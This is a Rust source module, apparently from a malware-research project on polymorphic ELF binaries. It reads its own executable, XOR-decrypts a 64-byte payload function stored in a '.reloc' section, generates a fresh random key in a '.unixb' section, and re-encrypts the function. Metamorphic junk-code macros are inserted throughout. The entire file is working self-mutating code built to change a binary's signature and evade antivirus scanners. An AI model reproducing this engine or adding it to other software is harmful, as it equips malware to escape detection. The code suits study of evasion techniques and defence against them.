#![allow(warnings)]
#![feature(asm)]

// https://github.com/PoCInnovation/Whitecomet-Research/
// https://github.com/PoCInnovation/Whitecomet-Research/blob/master/Polymorphic/Linux-ELF/src/main.c

use std::arch::asm;
use object::{File, Object, ObjectSection};
use std::error::Error;

use rand;

// modules
use crate::metamorphic;

// Payload function section size
pub const CRYPTED_FUNC_SIZE: usize = 64;

/// Get ELF sections from specified name.
///
/// # Arguments
///
/// * `file` - Opened file handle
/// * `name` - Section name to retrieve
///
/// # Return value
///
/// Section file offset range.
fn get_section(file: &File, name: &str) -> Option<(u64, u64)> {
    for section in file.sections() {
        metamorphic::junk!();
        match section.name() {
            Ok(n) if n == name => {
                return section.file_range();
            }
            _ => {}
        }
        metamorphic::junk!();
    }
    None
}

/// Decrypt ELF section using key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Decryption key
///
/// # Return value
///
/// Decrypted function as int array.
pub fn decrypt_func(code: &mut [u8], key: &mut [u8; CRYPTED_FUNC_SIZE]) -> Result<[u8; CRYPTED_FUNC_SIZE], Box<dyn Error>> {
    let mut decrypted_func: [u8; CRYPTED_FUNC_SIZE] = [0; CRYPTED_FUNC_SIZE]; metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".reloc") {
        // println!("CRYPTED_FUNC_SIZE: {}, {}", CRYPTED_FUNC_SIZE, range.1);
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;
        for i in 0..CRYPTED_FUNC_SIZE {
            decrypted_func[i] = code[base + i] ^ key[i]; metamorphic::junk!();
        }
    }

    Ok(decrypted_func)
}

/// Encrypt function using regenerated key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `decrypted_func` - Decrypted function array
/// * `key` - Decryption key
///
/// # Return value
///
/// True if key is regenerated and encrypted function array with key is stored back into memory.
pub fn encrypt_func(code: &mut [u8], decrypted_func: [u8; CRYPTED_FUNC_SIZE], key: &mut [u8; CRYPTED_FUNC_SIZE]) -> Result<(), Box<dyn Error>> {
    generate_key(code, key).ok(); metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".reloc") {
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;
        for i in base..(base + CRYPTED_FUNC_SIZE) {
            code[i] = decrypted_func[i - base] ^ key[i - base]; metamorphic::junk!();
        }
    }

    Ok(())
}

/// Regenerate key randomly and store back into memory
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Decryption key
///
/// # Return value
///
/// True if regenerated key is stored back into memory.
fn generate_key(code: &mut [u8], key: &mut [u8; CRYPTED_FUNC_SIZE]) -> Result<(), Box<dyn Error>> {
    for i in 0..CRYPTED_FUNC_SIZE {
        key[i] = rand::random::<u8>() % 255; metamorphic::junk!();
    }

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".unixb") {
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;
        for i in base..(base + CRYPTED_FUNC_SIZE) {
            code[i] = key[i - base]; metamorphic::junk!();
        }
    }

    Ok(())
}

